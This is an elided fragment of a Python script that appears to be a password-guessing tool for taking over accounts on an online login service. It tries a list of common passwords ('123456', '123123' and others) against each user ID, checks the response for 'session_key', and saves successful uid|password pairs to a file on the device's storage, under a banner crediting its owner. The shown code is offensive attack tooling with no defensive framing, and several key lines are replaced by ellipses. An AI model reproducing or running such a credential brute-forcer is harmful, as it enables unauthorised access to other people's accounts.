...
\033[1;93m{line}
\033[1;97m Owner : Z0H9N P9P9 \x1b[1;92m|\x1b[1;96m personl
\033[1;93m{line}'''.format(P='\x1b[1;97m',G='\x1b[1;92m',line='═'*34)
#----------------------------[MAIN/DEF]-----------------------------------#
def main():
    user=[]
    os.system("clear")
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","123123","143143"]:
            ...
            if "session_key" in rp:
                print(f"\r\r{G} [Z0H9N-OK] {uid} • {pw}")
                open("/sdcard/zohan-OK","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
